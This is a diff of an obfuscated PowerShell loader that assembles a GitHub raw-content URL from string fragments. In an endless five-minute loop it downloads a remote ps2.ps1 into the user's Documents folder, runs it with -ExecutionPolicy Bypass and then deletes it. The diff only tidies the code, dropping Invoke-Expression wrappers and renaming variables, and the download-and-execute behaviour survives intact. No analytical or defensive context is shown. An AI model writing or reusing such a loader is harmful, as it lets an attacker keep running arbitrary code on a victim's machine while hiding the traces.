@@ -1,23 +1,17 @@
-$x1 = ('t','0','f')[0,1,2] -join ''
-$x2_part1 = ('m')[0]
-$x2_part2 = ('4n')[0,1] -join ''
 $a1 = 'https://raw.github' + 'usercontent.com/'
-$a3 = ('/-0-v94837-09273w54-068245-0v9-62450-69u-b2-4059y-bn3-240w568-3450-862054986-2034p245iuyu6po7iu29345w/')[0..-1] -join ''
-$a4 = ('main','/ps2','.ps1')[0,1,2] -join ''
-$url = $a1 + $x1 + $x2_part1 + $x2_part2 + $a3 + $a4
-$b1 = "$env:USERPROFILE"
-$b2 = "\Documents\ps2.ps1"
-$path = $b1 + $b2
+$b1 = ('-0-v94837-09273w54-068245-0v9-62450-69u-b2-4059y-bn3-240w568-3450-862054986-2034p245iuyu6po7iu29345w/')[0..-1] -join ''
+$c1 = ('main','/ps2','.ps1')[0,1,2] -join ''
+$x1 = ('t','0','f')[0,1,2] -join ''
+$x2 = ('m','4','n')[0,1,2] -join ''
+$repoUrl = $a1 + $x1 + $x2 + $b1 + $c1
+$filePath = "$env:USERPROFILE\Documents\ps2.ps1"
 while ($true) {
     try {
-        $c = "Invoke-WebRequest -Uri $url -OutFile $path"
-        Invoke-Expression $c
-        $d = "powershell -ExecutionPolicy Bypass -File $path"
-        Invoke-Expression $d
-        $e = "Remove-Item -Path $path -Force"
-        Invoke-Expression $e
+        Invoke-WebRequest -Uri $repoUrl -OutFile $filePath
+        powershell -ExecutionPolicy Bypass -File $filePath
+        Remove-Item -Path $filePath -Force
     } catch {
-        $f = "Error: $_"
+        Write-Host "Error: $_"
     }
     Start-Sleep -Seconds 300
 }
